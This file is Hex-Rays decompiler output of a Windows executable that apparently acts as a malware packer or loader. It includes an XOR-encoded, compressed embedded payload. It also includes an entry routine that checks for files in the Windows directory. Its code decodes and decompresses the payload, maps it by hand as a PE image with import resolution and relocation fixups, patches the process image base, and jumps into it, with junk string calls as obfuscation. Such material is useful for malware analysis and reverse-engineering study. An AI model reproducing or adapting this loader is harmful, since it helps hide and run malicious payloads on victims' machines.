/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_401040(int, int, int);
// int __usercall start@<eax>(int@<ebx>, int@<edi>, int@<esi>);
FARPROC __cdecl sub_401350(HMODULE hModule, LPCSTR lpProcName);
int __stdcall sub_401370(int);
LPVOID __cdecl sub_4017B0(SIZE_T dwSize);
int __cdecl sub_4017E0(int, int);
int __cdecl sub_401940(int);
unsigned int __cdecl sub_401970(char *a1, int a2, unsigned int a3);
int __cdecl sub_401A90(_DWORD *, unsigned __int8 *);

//-------------------------------------------------------------------------
// Data declarations

// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern UINT (__stdcall *GetWindowsDirectoryA)(LPSTR lpBuffer, UINT uSize);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern LPVOID (__stdcall *MapViewOfFileEx)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap, LPVOID lpBaseAddress);
// extern BOOL (__stdcall *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// extern HICON (__stdcall *LoadIconA)(HINSTANCE hInstance, LPCSTR lpIconName);
_UNKNOWN loc_401310; // weak
_DWORD dword_424222[159] =
{
  17015,
  22016,
  -1873092474,
  768,
  43420,
  16776960,
  5532,
  0,
  119205276,
  117905928,
  437166982,
  8390407,
  521055644,
  -1275064646,
  -1205772139,
  567102465,
  1936311752,
  1869770784,
  1835130875,
  1851876128,
  544522994,
  1914725730,
  1763754985,
  1329864814,
  1869450703,
  221144420,
  438609809,
  1162888199,
  21802396,
  480968712,
  135979269,
  234938456,
  33662623,
  1572920,
  5418396,
  131072,
  1369500,
  1048576,
  439397788,
  438206727,
  436380056,
  20480262,
  1082239622,
  -1069742822,
  -1760711802,
  68813079,
  44419,
  738597408,
  436578694,
  119146501,
  805877659,
  268435568,
  438938502,
  442859801,
  588968341,
  672797826,
  1702134708,
  29816,
  437740956,
  403800327,
  1166123398,
  1611007514,
  778083740,
  1635017060,
  -1610568292,
  806421530,
  1954655110,
  236592128,
  1610673588,
  1701981888,
  845398768,
  1078134298,
  505981574,
  807931930,
  443712348,
  437014790,
  441486744,
  438334471,
  775980429,
  443773794,
  445161880,
  436830470,
  807088011,
  443100864,
  85654938,
  443565186,
  135986587,
  219831683,
  1869400292,
  -2130240925,
  119156223,
  438837377,
  776111501,
  1650553971,
  729000326,
  -1879048192,
  738241948,
  704643072,
  1887551366,
  327373594,
  441712262,
  578888321,
  -1947917111,
  -1010235323,
  -2082134839,
  -1130297108,
  -922685972,
  -1872305921,
  -804214138,
  -871362790,
  -1273978234,
  -1408233702,
  -1072651642,
  -938471654,
  -1005542778,
  1393560346,
  -1990708992,
  13762,
  -1655657028,
  832395420,
  68813900,
  -1534849268,
  822128028,
  -2052976704,
  -1736138148,
  -1207959552,
  44445,
  -956915185,
  -2096637539,
  1080064013,
  -2056868708,
  119175634,
  -1023955056,
  8388608,
  68920710,
  984090,
  137012358,
  34538778,
  269460870,
  57985,
  135965084,
  -1040834545,
  1076536454,
  1965090176,
  5548,
  -1576042496,
  117749665,
  68820598,
  -1576063514,
  595120773,
  1077520518,
  444664692,
  33587353,
  1536163840,
  445673045,
  8392454,
  -991187556,
  18548506,
  -773083748
}; // weak
CHAR String2[] = "XAXCXCAC"; // idb
CHAR aHhEx[] = "\\hh.ex"; // idb
CHAR aE[] = "e"; // idb
CHAR aAxxcaxaxxaxcax[] = "aXXCAXAXXAXCAXb"; // idb
CHAR aAcaaxxxaab[] = "aCAAXXXAAb"; // idb
CHAR aAcacxxcb[] = "aCACXXCb"; // idb
CHAR aHxaaxxacxaxaxc[] = "\\hXAAXXACXAXAXCh.exe"; // idb
CHAR aAacxaaacxaccab[] = "aACXAAACXACCAb"; // idb
CHAR aAxxccax[] = "AXXCCAX"; // idb
CHAR ModuleName[] = "kernel32.dll"; // idb
CHAR aAxcaxcacccb[] = "aXCAXCACCCb"; // idb
CHAR ProcName[] = "UnmapViewOfFile"; // idb
CHAR aCreatefilemapp[] = "CreateFileMappingA"; // idb
CHAR aVirtualalloc[] = "VirtualAlloc"; // idb
CHAR aAaaxxcaaaaxaca[] = "aAAXXCAAAAXACAb"; // idb
CHAR aLoadlibrarya[] = "LoadLibraryA"; // idb
CHAR aAcxxxb[] = "aCXXXb"; // idb
CHAR aMapviewoffilee[] = "MapViewOfFileEx"; // idb
CHAR aAcacccxxcaaxca[] = "aCACCCXXCAAXCACXb"; // idb
CHAR aVirtualfree[] = "VirtualFree"; // idb
CHAR aUnmapviewoffil_0[] = "UnmapViewOfFile"; // idb
CHAR aVirtualalloc_0[] = "VirtualAlloc"; // idb
CHAR aKernel32Dll_1[] = "kernel32.dll"; // idb
CHAR aCcxx[] = "CCXX"; // idb
CHAR aAaacccxaxxcacb[] = "aAACCCXAXXCACb"; // idb
int dword_428620 = 0; // weak
int dword_428624 = 0; // weak
int dword_428628 = 0; // weak
int dword_42862C = 0; // weak
int dword_428630 = 0; // weak
int dword_428634 = 0; // weak
int dword_428638 = 0; // weak
int dword_42863C = 0; // weak
int (*dword_428640)(void) = NULL; // weak
CHAR String1[2464] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb


//----- (00401040) --------------------------------------------------------
int __cdecl sub_401040(int a1, int a2, int a3)
{
  int result; // eax

  for ( dword_428628 = 0; dword_428628 < a3; ++dword_428628 )
  {
    *(_BYTE *)(dword_428628 + a1) = *(_BYTE *)(dword_428628 + a2);
    result = dword_428628 + 1;
  }
  return result;
}
// 428628: using guessed type int dword_428628;

//----- (004010E0) --------------------------------------------------------
int __usercall start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  SIZE_T dwSize; // [esp+Ch] [ebp-150h]
  unsigned int v5; // [esp+10h] [ebp-14Ch]
  CHAR Buffer; // [esp+14h] [ebp-148h] BYREF
  char v7; // [esp+15h] [ebp-147h]
  char *v8; // [esp+144h] [ebp-18h]
  HMODULE ModuleHandleA; // [esp+14Ch] [ebp-10h]
  HANDLE v10; // [esp+150h] [ebp-Ch]
  unsigned int i; // [esp+158h] [ebp-4h]
  int savedregs; // [esp+15Ch] [ebp+0h] BYREF

  lstrcpyA(String1, String2);
  ModuleHandleA = GetModuleHandleA(0);
  LoadIconA(0, (LPCSTR)0x7F00);
  GetWindowsDirectoryA(&Buffer, 0x12Cu);
  if ( v7 != 58 )
    return 0;
  lstrcatA(&Buffer, aHhEx);
  lstrcatA(&Buffer, aE);
  v10 = CreateFileA(&Buffer, 1u, 3u, 0, 3u, 0x80u, 0);
  if ( v10 == (HANDLE)-1 )
  {
    lstrcpyA(String1, aAxxcaxaxxaxcax);
    return 0;
  }
  else
  {
    lstrcpyA(String1, aAcaaxxxaab);
    GetWindowsDirectoryA(&Buffer, 0x12Cu);
    if ( v7 == 58 )
    {
      lstrcatA(&Buffer, aHxaaxxacxaxaxc);
      v10 = CreateFileA(&Buffer, 1u, 3u, 0, 3u, 0x80u, 0);
      if ( v10 == (HANDLE)-1 )
      {
        v8 = (char *)dword_424222;
        v5 = dword_424222[0];
        dwSize = dword_424222[1];
        lstrcpyA(String1, aAxxccax);
        for ( i = 0; i < v5; i += 8 )
        {
          GetModuleHandleA(0);
          *(_DWORD *)&v8[i + 8] ^= 0xAD9Cu;
        }
        dword_428638 = (int)sub_4017B0(dwSize);
        sub_401970(v8 + 8, dword_428638, v5);
        dword_42862C = a2;
        dword_428624 = a3;
        dword_428634 = a1;
        dword_42863C = (int)NtCurrentTeb();
        i = (unsigned int)&loc_401310;
        dword_428630 = (int)&savedregs;
        sub_4017E0(&loc_401310 - (_UNKNOWN *)ModuleHandleA, (int)ModuleHandleA);
        sub_401370(dword_428638);
        return dword_428640();
      }
      else
      {
        lstrcpyA(String1, aAacxaaacxaccab);
        return 0;
      }
    }
    else
    {
      lstrcpyA(String1, aAcacxxcb);
      return 0;
    }
  }
}
// 424222: using guessed type _DWORD dword_424222[159];
// 428624: using guessed type int dword_428624;
// 42862C: using guessed type int dword_42862C;
// 428630: using guessed type int dword_428630;
// 428634: using guessed type int dword_428634;
// 428638: using guessed type int dword_428638;
// 42863C: using guessed type int dword_42863C;
// 428640: using guessed type int (*dword_428640)(void);

//----- (00401350) --------------------------------------------------------
FARPROC __cdecl sub_401350(HMODULE hModule, LPCSTR lpProcName)
{
  return GetProcAddress(hModule, lpProcName);
}

//----- (00401370) --------------------------------------------------------
int __stdcall sub_401370(int a1)
{
  FARPROC v1; // eax
  _DWORD *j; // [esp+0h] [ebp-C8h]
  HMODULE hModule; // [esp+8h] [ebp-C0h]
  CHAR String1[116]; // [esp+10h] [ebp-B8h] BYREF
  LPVOID (__stdcall *VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD); // [esp+84h] [ebp-44h]
  int v7; // [esp+88h] [ebp-40h]
  BOOL (__stdcall *UnmapViewOfFile)(LPCVOID); // [esp+8Ch] [ebp-3Ch]
  int *v9; // [esp+90h] [ebp-38h]
  int v10; // [esp+94h] [ebp-34h]
  _DWORD *v11; // [esp+9Ch] [ebp-2Ch]
  int *v12; // [esp+A0h] [ebp-28h]
  HMODULE (__stdcall *LoadLibraryA)(LPCSTR); // [esp+A4h] [ebp-24h]
  HMODULE v14; // [esp+ACh] [ebp-1Ch]
  int v15; // [esp+B0h] [ebp-18h]
  LPVOID (__stdcall *MapViewOfFileEx)(HANDLE, DWORD, DWORD, DWORD, SIZE_T, LPVOID); // [esp+B4h] [ebp-14h]
  BOOL (__stdcall *VirtualFree)(LPVOID, SIZE_T, DWORD); // [esp+B8h] [ebp-10h]
  unsigned int i; // [esp+BCh] [ebp-Ch]
  HANDLE hFileMappingObject; // [esp+C0h] [ebp-8h]
  HANDLE (__stdcall *CreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR); // [esp+C4h] [ebp-4h]

  hModule = GetModuleHandleA(ModuleName);
  lstrcpyA(String1, aAxcaxcacccb);
  hFileMappingObject = 0;
  UnmapViewOfFile = (BOOL (__stdcall *)(LPCVOID))GetProcAddress(hModule, ProcName);
  hFileMappingObject = 0;
  CreateFileMappingA = (HANDLE (__stdcall *)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))GetProcAddress(hModule, aCreatefilemapp);
  hFileMappingObject = 0;
  VirtualAlloc = (LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hModule, aVirtualalloc);
  lstrcpyA(String1, aAaaxxcaaaaxaca);
  LoadLibraryA = (HMODULE (__stdcall *)(LPCSTR))GetProcAddress(hModule, aLoadlibrarya);
  lstrcpyA(String1, aAcxxxb);
  MapViewOfFileEx = (LPVOID (__stdcall *)(HANDLE, DWORD, DWORD, DWORD, SIZE_T, LPVOID))GetProcAddress(
                                                                                         hModule,
                                                                                         aMapviewoffilee);
  lstrcpyA(String1, aAcacccxxcaaxca);
  VirtualFree = (BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD))GetProcAddress(hModule, aVirtualfree);
  hFileMappingObject = 0;
  UnmapViewOfFile = (BOOL (__stdcall *)(LPCVOID))GetProcAddress(hModule, aUnmapviewoffil_0);
  v7 = *(_DWORD *)(a1 + 60) + a1;
  v11 = (_DWORD *)(v7 + *(unsigned __int16 *)(v7 + 20) + 24);
  v10 = (int)VirtualAlloc(0, *(_DWORD *)(v7 + 80), 12288, 64);
  sub_401040(v10, a1, *(_DWORD *)(a1 + 60) + 40 * *(unsigned __int16 *)(v7 + 6) + 312);
  for ( i = 0; i < *(unsigned __int16 *)(v7 + 6); ++i )
  {
    if ( v11[5] )
    {
      if ( v11[4] )
        sub_401040(
          v11[3] + v10,
          v11[5] + a1,
          *(_DWORD *)(v7 + 60) * ((unsigned int)(v11[4] + *(_DWORD *)(v7 + 60) - 1) / *(_DWORD *)(v7 + 60)));
    }
    v11 += 10;
  }
  v7 = *(_DWORD *)(v10 + 60) + v10;
  hFileMappingObject = CreateFileMappingA((HANDLE)-1, 0, 4, 0, *(_DWORD *)(v7 + 80), 0);
  for ( j = (_DWORD *)(*(_DWORD *)(v7 + 128) + v10); j[4]; j += 5 )
  {
    v14 = LoadLibraryA((LPCSTR)(j[3] + v10));
    if ( *j )
    {
      v12 = (int *)(*j + v10);
      v9 = (int *)(j[4] + v10);
    }
    else
    {
      v12 = (int *)(j[4] + v10);
      v9 = (int *)(*j + v10);
    }
    v15 = 0;
    if ( j[4] && *j )
      v15 = 1;
    while ( *v12 )
    {
      if ( *v12 >= 0 )
        v1 = sub_401350(v14, (LPCSTR)(*v12 + v10 + 2));
      else
        v1 = sub_401350(v14, (LPCSTR)(*v12 & 0x7FFFFFFF));
      *v12 = (int)v1;
      if ( v15 )
        *v9 = *v12;
      ++v12;
      ++v9;
    }
  }
  dword_428620 = (int)MapViewOfFileEx(hFileMappingObject, 34, 0, 0, 0, *(LPVOID *)(v7 + 52));
  if ( !dword_428620 )
  {
    if ( !UnmapViewOfFile(*(LPCVOID *)(v7 + 52)) && !::VirtualFree(*(LPVOID *)(v7 + 52), 0, 0x8000u) )
      return 0;
    dword_428620 = (int)::MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, *(LPVOID *)(v7 + 52));
    if ( !dword_428620 )
      dword_428620 = (int)::VirtualAlloc(*(LPVOID *)(v7 + 52), *(_DWORD *)(v7 + 80), 0x3000u, 0x40u);
  }
  CloseHandle(hFileMappingObject);
  sub_401040(dword_428620, v10, *(_DWORD *)(v7 + 80));
  sub_401940(dword_428620);
  dword_428640 = (int (*)(void))(*(_DWORD *)(v7 + 40) + dword_428620);
  *(_DWORD *)(v7 + 40) = dword_428640;
  return 1;
}
// 428620: using guessed type int dword_428620;
// 428640: using guessed type int (*dword_428640)(void);

//----- (004017B0) --------------------------------------------------------
LPVOID __cdecl sub_4017B0(SIZE_T dwSize)
{
  return VirtualAlloc(0, dwSize, 0x3000u, 4u);
}

//----- (004017E0) --------------------------------------------------------
int __cdecl sub_4017E0(int a1, int a2)
{
  HMODULE ModuleHandleA; // eax
  LPVOID (__stdcall *VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD); // eax
  _DWORD *v5; // [esp+8h] [ebp-1Ch]
  int v6; // [esp+Ch] [ebp-18h]
  SIZE_T *v7; // [esp+14h] [ebp-10h]
  unsigned int v8; // [esp+18h] [ebp-Ch]
  _DWORD *i; // [esp+1Ch] [ebp-8h]
  unsigned int j; // [esp+20h] [ebp-4h]

  v7 = (SIZE_T *)(*(_DWORD *)(a2 + 60) + a2);
  ModuleHandleA = GetModuleHandleA(aKernel32Dll_1);
  VirtualAlloc = (LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(ModuleHandleA, aVirtualalloc_0);
  dword_428620 = (int)VirtualAlloc(0, v7[20], 12288, 64);
  if ( dword_428620 )
  {
    sub_401040(dword_428620, a2, v7[20]);
    v6 = dword_428620 - a2;
    if ( v7[41] )
    {
      for ( i = (_DWORD *)(v7[40] + a2); i[1]; i = (_DWORD *)((char *)i + i[1]) )
      {
        v8 = (unsigned int)(i[1] - 8) >> 1;
        v5 = i + 2;
        for ( j = 0; j < v8; ++j )
        {
          if ( (int)*((unsigned __int16 *)v5 + j) >> 12 == 3 )
            *(_DWORD *)(*i + dword_428620 + (*((_WORD *)v5 + j) & 0xFFF)) += v6;
        }
      }
    }
    __asm { jmp     edx }
  }
  return 2;
}
// 428620: using guessed type int dword_428620;

//----- (00401940) --------------------------------------------------------
int __cdecl sub_401940(int a1)
{
  int result; // eax

  result = *(_DWORD *)(dword_42863C + 48);
  *(_DWORD *)(result + 8) = a1;
  return result;
}
// 42863C: using guessed type int dword_42863C;

//----- (00401970) --------------------------------------------------------
unsigned int __cdecl sub_401970(char *a1, int a2, unsigned int a3)
{
  unsigned int result; // eax
  int v4; // eax
  int v5; // eax
  char String1[116]; // [esp+0h] [ebp-90h] BYREF
  int v7; // [esp+74h] [ebp-1Ch] BYREF
  unsigned int i; // [esp+78h] [ebp-18h]
  int v9; // [esp+7Ch] [ebp-14h]
  char v10; // [esp+83h] [ebp-Dh]
  unsigned int v11; // [esp+84h] [ebp-Ch] BYREF
  unsigned int v12; // [esp+88h] [ebp-8h]
  char v13; // [esp+8Fh] [ebp-1h]

  v12 = 1;
  v10 = *a1;
  lstrcpyA(String1, aAaacccxaxxcacb);
  v9 = 0;
  do
  {
    v13 = a1[v12++];
    if ( v13 == v10 )
    {
      if ( a1[v12] )
      {
        v4 = sub_401A90(&v11, (unsigned __int8 *)&a1[v12]);
        v12 += v4;
        v5 = sub_401A90(&v7, (unsigned __int8 *)&a1[v12]);
        result = v12 + v5;
        v12 = result;
        for ( i = 0; i < v11; ++i )
        {
          *(_BYTE *)(v9 + a2) = *(_BYTE *)(a2 + v9 - v7);
          ++v9;
          result = i + 1;
        }
      }
      else
      {
        *(_BYTE *)(v9 + a2) = v10;
        result = ++v9;
        ++v12;
      }
    }
    else
    {
      *(_BYTE *)(v9 + a2) = v13;
      result = ++v9;
    }
  }
  while ( v12 < a3 );
  return result;
}
// 401970: using guessed type CHAR String1[116];

//----- (00401A90) --------------------------------------------------------
int __cdecl sub_401A90(_DWORD *a1, unsigned __int8 *a2)
{
  char String1[112]; // [esp+0h] [ebp-80h] BYREF
  int v4; // [esp+70h] [ebp-10h]
  int v5; // [esp+74h] [ebp-Ch]
  int v6; // [esp+78h] [ebp-8h]
  int v7; // [esp+7Ch] [ebp-4h]

  v7 = 0;
  v5 = 0;
  lstrcpyA(String1, aCcxx);
  do
  {
    v6 = *a2++;
    v4 = v7 << 7;
    v7 = (v7 << 7) | v6 & 0x7F;
    ++v5;
  }
  while ( (v6 & 0x80) != 0 );
  *a1 = v7;
  return v5;
}
// 401A90: using guessed type CHAR String1[112];

// nfuncs=9 queued=9 decompiled=9 lumina nreq=0 worse=0 better=0
// ALL OK, 9 function(s) have been successfully decompiled
